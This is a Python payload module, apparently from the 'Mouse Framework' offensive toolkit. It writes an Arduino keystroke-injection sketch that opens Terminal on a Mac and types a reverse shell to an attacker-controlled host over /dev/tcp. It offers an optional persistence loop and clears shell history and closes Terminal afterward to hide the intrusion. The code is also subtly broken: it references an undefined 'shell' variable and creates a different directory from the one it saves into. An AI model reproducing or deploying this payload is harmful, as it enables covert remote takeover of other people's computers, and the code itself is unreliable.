#!/usr/bin/env python

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

from core import helper as h
import os, time

class payload:
	def __init__(self):
		self.name = "Arduino macOS payload"
		self.description = "Arduino payload that replicates keystrokes for shell script execution."
		self.usage = "Install via arduino."

	def run(self,server):
		while 1:
			persistence = raw_input(h.info_question_raw("Make Persistent? (y/n): ")).strip(" ").lower()
			if persistence == "y":
				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
				break
			else:
				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
				break
		shell_command += "history -wc;killall Terminal"
		if os.path.exists("payloads") == False:
			os.mkdir("payloads")
		if os.path.exists("payloads/teensy_macos") == False:
			os.mkdir("payloads/teensy_macos")
		payload_save_path = "payloads/arduino_macos/arduino_macos.ino"
		payload = """\
#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  Keyboard.begin();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("terminal"));

  delay(500);
  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F(\""""+shell_command+"""\"));

  delay(500);
  typeKey(KEY_RETURN);

  Keyboard.end();
}

void loop() {}"""
		h.info_general("Saving to " + payload_save_path + "...")
		f = open(payload_save_path,"w")
		f.write(payload)
		f.close()
		h.info_success("Payload saved to " + payload_save_path + "!")
